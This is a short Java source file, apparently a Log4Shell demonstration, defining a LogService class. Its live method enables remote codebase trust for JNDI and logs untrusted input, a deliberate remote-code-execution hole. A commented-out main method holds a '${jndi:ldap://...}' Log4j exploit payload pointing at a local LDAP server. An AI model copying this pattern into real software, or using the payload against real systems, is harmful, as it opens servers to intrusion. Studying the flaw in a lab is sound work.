package com.lxx.oa.service;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @author 林修贤
 * @date 2023/2/5
 * @description
 */
public class LogService {
    private static final Logger logger = LogManager.getLogger(LogService.class);
//    public static void main(String[] args) {
//        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
//        logger.error("${jndi:ldap://127.0.0.1:1389/Log4jRCE}");
//    }
    public void outputError(String errorInfo){
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        logger.error(errorInfo);
    }
}
